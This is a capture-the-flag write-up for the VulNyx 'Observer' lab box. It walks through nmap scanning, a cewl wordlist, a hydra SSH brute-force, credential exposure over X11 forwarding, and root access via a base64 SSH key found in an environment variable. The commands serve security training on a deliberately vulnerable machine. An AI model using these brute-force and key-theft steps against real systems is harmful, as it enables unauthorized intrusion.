---
title: VulNyx - Observer Writeup
date: 2025-06-11 20:45:00 +0530
categories: [Vulnyx, Writeups]
tags: [linux, cewl, hydra, ssh-bruteforce, x11forwarding, credential-exposure, env, privesc]
description: 
---

`Observer` is an easy difficulty linux box. This machine consists of brute-forcing an SSH instance, initial access via X11Forwarding, user credential exposure, and finally privilege escalation via an exposed root SSH private key in the environment variables.

## Enumeration

### Nmap

Performing a basic port scan and service enumeration with `nmap` gives us the following 

```bash
❯ nmap -p- observer.nyx -v     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 08:43 EDT
Initiating ARP Ping Scan at 08:43
Scanning observer.nyx (192.168.25.16) [1 port]
Completed ARP Ping Scan at 08:43, 0.05s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at 08:43
Scanning observer.nyx (192.168.25.16) [65535 ports]
Discovered open port 22/tcp on 192.168.25.16
Discovered open port 80/tcp on 192.168.25.16
Completed SYN Stealth Scan at 08:43, 1.96s elapsed (65535 total ports)
Nmap scan report for observer.nyx (192.168.25.16)
Host is up (0.000087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:81:C3:75 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
❯ nmap -sC -sV -p 22,80 observer.nyx 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 08:43 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for observer.nyx (192.168.25.16)
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: iData-Hosting-Free-Bootstrap-Responsive-Webiste-Template
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:81:C3:75 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
```

As we can see we have OpenSSH running on port `22` and an Apache httpd server running on port 80

## HTTP (80)

We tried performing directory and v-host enumeration but could not find anything useful. However, the website content contained possible usernames as shown below.

![image.png](/assets/img/observer_vulnyx/image.png)

### Creating username wordlist

```bash
❯ cat users.txt                           
john
mike
remo
niscal
```

### Creating password wordlist (cewl)

We created a wordlist using `cewl` that can be used to attempt a SSH brute-force attack. 

```bash
❯ cewl http://observer.nyx -w wordlist.txt
```

## SSH Brute-force

By performing a brute-force attack we obtained valid SSH credentials `niscal:niscal`

```bash
hydra -L users.txt -P wordlist.txt ssh://observer.nyx:22 -u 
```
![image.png](/assets/img/observer_vulnyx/image%206.png)

![image.png](/assets/img/observer_vulnyx/image%201.png)

Interesting..let’s try logging in by using trusted `X11Forwarding`



```bash
ssh -Y niscal@observer.nyx
```

We find exposed credentials for the user `remo`

![image.png](/assets/img/observer_vulnyx/image%202.png)

## User flag

![image.png](/assets/img/observer_vulnyx/image%203.png)

## Privilege Escalation

### Environment variables

```bash
remo@observer:~$ env
```
We discovered an environment variable name `rootKEY` which appears to be encoded in `base64` 

![image.png](/assets/img/observer_vulnyx/image%204.png)

### Decoding base64 “rootKEY”

We decoded the `base64` encoded `rootKEY` which revealed an SSH private key which we stored in the file `private_key` and modified permissions.

```bash
echo -n "redacted"| base64 -d > private_key
```

```bash
chmod 600 private_key
```

### Root flag

```bash
ssh -i private_key root@observer.nyx
```

![image.png](/assets/img/observer_vulnyx/image%205.png)